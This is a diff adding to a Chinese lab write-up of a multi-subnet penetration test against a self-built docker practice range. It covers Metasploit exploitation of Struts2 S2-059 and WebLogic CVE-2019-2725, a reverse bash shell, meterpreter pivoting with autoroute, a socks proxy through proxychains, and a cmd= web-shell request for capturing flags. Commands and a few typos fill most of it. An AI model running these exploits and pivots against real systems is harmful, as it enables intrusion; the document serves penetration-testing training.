@@ -388,13 +388,365 @@
 
 - 即在上面已经搭建好的 `手搓dmz` （双层网段的渗透测试环境）
 - 进入【场景】，启动场景
-- 阅读场景说明，找到场景入口地址，可以使用指令 `docker ps` 来查看镜像信息，得到我们需要访问的端口号
+- 阅读场景说明，找到场景入口地址，可以使用指令 `docker ps` 来查看当前运行的镜像信息，得到我们需要访问的端口号
 - 打开浏览器，输入 `靶机IP:端口号`
 
-    <img src="img/entrance_port.png" alt="entrance_port" style="zoom:50%;" />
+  <img src="img/entrance_port.png" alt="entrance_port" style="zoom:50%;" />
+
+#### 2.捕获指定容器的上下行流量
+
+> 为后续的攻击过程「分析取证」保存流量数据
+
+  ```bash
+  $ docker ps # 先查看目标容器名称或ID
+  $ container_name="<替换为目标容器名称或ID>"
+  $ docker run --rm --net=container:${container_name} -v ${PWD}/tcpdump/${container_name}:/tcpdump kaazing/tcpdump
+  ```
+  
+  <img src="img/tcpdump.png" alt="tcpdump" style="zoom:50%;" />
+
+- 建议放到 tmux 会话中，然后放到后台运行
+
+  <img src="img/tmux.png" alt="tmux" style="zoom:50%;" />
+
+
+#### 3.攻破靶标1
+
+- 切换到攻击者主机 attacker 进行 metasploit 基础配置
+
+  > Metasploit 是一款用于渗透测试和漏洞利用的开源工具，旨在帮助安全专家评估和增强计算机系统、网络和应用程序的安全性。它是一个广泛使用的渗透测试框架，包含一个控制台界面，称为 Metasploit Console 或 msfconsole，以及一组命令行工具，用于执行各种渗透测试任务。Metasploit 还提供了一个巨大的漏洞数据库和利用代码库，使用户能够更容易地利用已知的漏洞。
+  > Metasploit 可以帮助安全团队或个人测试计算机系统中的漏洞，并利用这些漏洞，以检查系统的安全性和脆弱性。该工具具有丰富的功能和模块，使渗透测试人员能够执行各种攻击，包括远程执行代码、获取系统权限、发现敏感数据等。
+
+  ```bash
+  # metasploit 基础配置
+  # 更新 metasploit
+  $ sudo apt install -y metasploit-framework
+  # 初始化 metasploit 本地工作数据库
+  $ sudo msfdb init
+  # 启动 msfconsole
+  $ msfconsole
+  ```
+
+  <img src="img/msfconsole.png" alt="msfconsole" style="zoom:50%;" />  
+  
+  ```bash
+  # 确认已连接 pgsql
+  $ db_status
+  # 建立工作区
+  $ workspace -a Cynthia
+  ```
+
+  <img src="img/db_workspace.png" alt="db_workspace" style="zoom:50%;" /> 
+
+- 首先要收集服务识别与版本等信息，不断搜索并且完善关键词，最后找到我们所需的 **exp**：`exploit/multi/http/struts2_multi_eval_ognl`
+
+  ```bash
+  # search exp in metasploit
+  $ search struts2 type:exploit
+  # 查看 exp 详情
+  # 可以直接通过搜索结果编号，也可以通过搜索结果的 Name 字段
+  $ info <结果编号或 Name 字段>
+  # 继续完善搜索关键词
+  $ search S2-059 type:exploit
+  ```
+
+  <img src="img/search_exp.png" alt="search_exp" style="zoom:50%;" /> 
+
+
+- 找到我们所需的 exp 后就选择使用，并且选择设置合适的 exp payload
+
+  ```bash
+  # 使用符合条件的 exp
+  $ use exploit/multi/http/struts2_multi_eval_ognl
+
+  # 查看可用 exp payloads
+  $ show payloads
+
+  # 使用合适的 exp payload
+  $ set payload payload/cmd/unix/reverse_bash
+  ```
+
+  <img src="img/use_n_set_exp.png" alt="use_n_set_exp" style="zoom:50%;" /> 
+
+- 查看并且配置 exp 参数，确保所有 `Required=yes` 参数均正确配置
+
+  ```bash
+  # 查看 exp 可配置参数列表
+  $ show options
+  # 靶机 IP
+  $ set RHOSTS 192.168.98.131 
+  # 靶机目标端口
+  $ set rport  53746          
+  # 攻击者主机 IP
+  $ set LHOST  192.168.98.130 
+
+  # 再次检查 exp 配置参数列表
+  $ show options
+  ```
+
+  <img src="img/show_options.png" alt="show_options" style="zoom:50%;" />
+
+
+  <img src="img/set_exp.png" alt="set_exp" style="zoom:50%;" />
+
+- 接下进行 getshell，如果攻击成功，查看打开的 reverse shell，进入会话后，发现无命令行交互提示信息，此时我们试一试 Bash 指令，可以发现我们已经打下了第一个靶标，查看其 `/tmp` 目录，成功得到 `flag1`。
+
+  ```bash
+  # getshell
+  $ exlpoit -j
+
+  # 如果攻击成功，查看打开的 reverse shell
+  $ sessions -l
+
+  # 进入会话 1
+  $ sessions -i 1
+
+  # 无命令行交互提示信息，试一试 Bash 指令
+  $ id
+  # get flag-1
+  $ ls /tmp
+  # flag-{bmh22c0ab9a-dbef-44b3-a55d-3c448528ae0d}
+
+  # 通过 CTRL-Z 将当前会话放到后台继续执行
+  ```
+
+
+  <img src="img/flag1.png" alt="flag1" style="zoom:50%;" />
+
+
+#### 4.建立立足点并发现靶标2-4
+
+- 升级会话 1 ，将普通的命令行（cmdshell）会话升级为 Meterpreter shell，对同一个主机新创建了一个会话，从而获得更强大的远程控制能力和更多的功能。
+
+  ```bash 
+  # upgrade cmdshell to meterpreter shell
+  $ sessions -u 1
+
+  # 查看新增的主机信息
+  $ hosts
+
+  # 进入 meterpreter 会话 2
+  $ sessions -i 3
+  ```
+
+  <img src="img/upgrade_cmdshell.png" alt="upgrade_cmdshell" style="zoom:50%;" />
+
+- 在实际环境中，我们通常会做一个端口扫描，在 metasploit 里可以使用 `db_nmap` 来进行扫描 `53746` 端口，也可以多扫描 80 端口、22 端口。
+
+  ```bash 
+  # 端口扫描
+  $ db_nmap -p 53746,80,22 192.168.98 131 -A -T4 -n
+
+  # 使用 db_nmap 的好处是在 services 里面能将结果直接导入到数据库中，可以随时看到我们的收获
+  $ services
+
+  # 查看主机信息，意外发现一个新的主机地址 192.171.84.4
+  $ hosts
+  ```
+
+  <img src="img/db_nmap.png" alt="db_nmap" style="zoom:50%;" />
+
+- 进入到会话 3 查看拓扑信息，发现其真正的内网地址是 `192.171.84.4`
+
+
+  ```bash
+  $ sessions -i 3
+
+  # setup pivot: run autoroute
+  # 查看网卡列表
+  ipconfig
+
+  # 查看路由表
+  route
+
+  # 查看 ARP 表
+  arp
+  ```
+
+  <img src="img/ipconfig.png" alt="ipconfig" style="zoom:50%;" />
+
+
+- 接下来，在会话 3 中将目标网段创建为我们当前主机的 Pivot 路由，可以通过会话 3 直接访问该网段，实现正向代理
+
+
+  ```bash
+  $ run autoroute -s 192.171.84.0/24
+
+  # 检查 Pivot 路由是否已创建成功
+  $ run autoroute -p
+  ```
+
+  <img src="img/autoroute.png" alt="autoroute" style="zoom:50%;" />
+
+- 退出 Meterpreter shell，搜索 `portscan`，选择 `auxiliary/scanner/portscan/tcp` 来进行端口扫描
+
+  ```bash
+  # portscan through pivot
+  $ search portscan
+  $ use auxiliary/scanner/portscan/tcp
+  # 查看可用参数
+  $ show options
+  ```
+
+  <img src="img/portscan.png" alt="portscan" style="zoom:50%;" />
+
+
+- 配置需要的参数，因为我们知道此处开放 `7001` 端口，所以就只设置该端口号，在实际中就要去根据我们的经验进行猜测
+
+  ```bash
+  # 根据子网掩码推导
+  $ set RHOSTS 192.171.84.2-254
+  # 根据「经验」
+  $ set rport 7001
+  # 根据「经验」
+  $ set threads 10
+  ```
+
+  <img src="img/set_portscan.png" alt="set_portscan" style="zoom:50%;" />
+
+- 开始扫描，等扫描结果出来后可以发现，三台主机确实存活，`7001` 端口 tcp 是开放的
+  
+  ```bash
+  # 开始扫描
+  $ exploit -j
+
+  # 等到扫描结果 100%
+  # 查看主机存活情况
+  $ hosts
+
+  # 查看发现的服务列表
+  $ services
+  ```
+
+  <img src="img/exploit_portscan.png" alt="exploit_portscan" style="zoom:50%;" />
+
+- 搜索 `socks_proxy`，使用该代理模块，该代理模块就能在攻击者主机上开启一个利用当前立足点会话建立起的一个跳板
+
+  ```bash
+  # setup socks5 proxy 
+  $ search socks_proxy
+  $ use auxiliary/server/socks_proxy
+  $ run -j
+  # 查看后台任务
+  $ jobs -l
+  ```
+
+  <img src="img/exploit_socks_proxy.png" alt="exploit_socks_proxy" style="zoom:50%;" />
+
+
+- 新开一个 ssh 会话窗口连接到攻击者主机上，查看端口监听情况，可以看到 `1080` 端口确实开启了一个 socks 代理
+
+  ```bash
+  # 检查 1080 端口服务开放情况
+  $ sudo lsof -i tcp:1080 -l -n -P
+  ```
+
+  <img src="img/port1080.png" alt="port1080" style="zoom:50%;" />
+
+
+- 编辑 `/etc/proxychains4.conf`，进行 tcp 连接扫描 `7001` 端口；虽然扫描输出的结果是 `filtered`，但其实是处于开放状态的
+
+  ```bash
+  $ sudo sed -i.bak -r "s/socks4\s+127.0.0.1\s+9050/socks5 127.0.0.1 1080/g" /etc/proxychains4.conf
+
+  $ proxychains sudo nmap -vv -n -p 7001 -Pn -sT 192.171.84.2-5
+  ```
+
+- 可以通过以下几个指令以此验证，可以发现出现了 `404` 错误，也说明网络层是连通的，而应用层我们只是请求了一个不存在的地址而已，这样我们就发现了靶标2-4了
+
+  ```bash
+  # 回到 metasploit 会话窗口
+  # 重新进入 shell 会话
+  sessions -i 1
+  curl http://192.170.84.2:7001 -vv
+  curl http://192.170.84.3:7001 -vv
+  curl http://192.170.84.4:7001 -vv
+  ```
+
+  <img src="img/curl404.png" alt="curl404" style="zoom:50%;" />
+
+
+#### 5.攻破靶标2-4
+
+- 搜索 `cve-2019-2725`，加载漏洞利用程序，同样还是要设置所需要的参数
+
+  ```bash
+  # search exploit
+  $ search cve-2019-2725
+
+  # getshell
+  $ use 0
+  $ show options
+
+  # 批量设置靶机 IP
+  $ set RHOSTS 192.171.84.2-5
+  
+  $ set lhost 192.168.98.130
+
+  # run
+  $  run -j
+  ```
+
+  <img src="img/search_cve-2019-2725.png" alt="search_cve-2019-2725" style="zoom:50%;" />
 
 
 
+- 进入会话中，查看 `/tmp` 目录，成功找到 `flag2-4`
+  
+  ```bash
+  # get flag2-4
+  $ sessions -c "ls /tmp" -i 6,7,8
+  ```
+
+  <img src="img/flag2-4.png" alt="flag2-4" style="zoom:50%;" />
+
+
+
+#### 6.发现并攻破终点靶标5
+
+- 有一台靶机是双网卡的，我们需要找到那台有双网卡的靶机，通过网卡、路由、ARP 成功发现最深层次的内网 `192.172.85.0/24`
+ 
+   ```bash
+  # 通过网卡、路由、ARP 发现新子网 192.172.85.0/24
+  $ sessions -c "ifconfig" -i 6,7,8
+
+  # portscan through pivot
+  # 将会话 8 （IP地址为192.171.84.5）升级为 meterpreter shell
+  $ sessions -u 8
+  # 新的 meterpreter shell 会话编号此处为 10
+  $ sessions -i 10
+  ```
+
+  <img src="img/session10.png" alt="session10" style="zoom:50%;" />
+
+
+- 我们可以直接在 meterpreter shell 中直接访问 IP 地址来进行枚举测试
+
+  ```bash
+  # 利用跳板机 192.171.84.5 的 meterpreter shell 会话「踩点」最终靶标
+  $ curl http://192.172.85.2
+  # 发现没安装 curl ，试试 wget
+  $ wget http://192.172.85.2
+  # 发现没有命令执行回显，试试组合命令
+  $ wget http://192.172.85.2 -O /tmp/result && cat /tmp/result
+  ```
+
+  <img src="img/flag_hint.png" alt="flag_hint" style="zoom:50%;" />
+
+- 得到输出结果，并且提示我们需要通过 `index.php?cmd=ls /tmp` 的方式执行，最后成功得到 `flag5`
+  
+  ```bash
+  # 发现 get flag 提示
+  $ wget 'http://192.172.85.2/index.php?cmd=ls /tmp' -O /tmp/result && cat /tmp/result"
+  # index.php?cmd=ls /tmpflag-{bmh6b110165-c5c5-4cc0-9079-f6d3305738c63}
+  ```
+
+  <img src="img/flag5.png" alt="flag5" style="zoom:50%;" />
+
+
+功夫不负有心人！终于攻破了该多网段渗透场景！
+
+<img src="img/completed.png" alt="completed" style="zoom:50%;" />
 
 
 
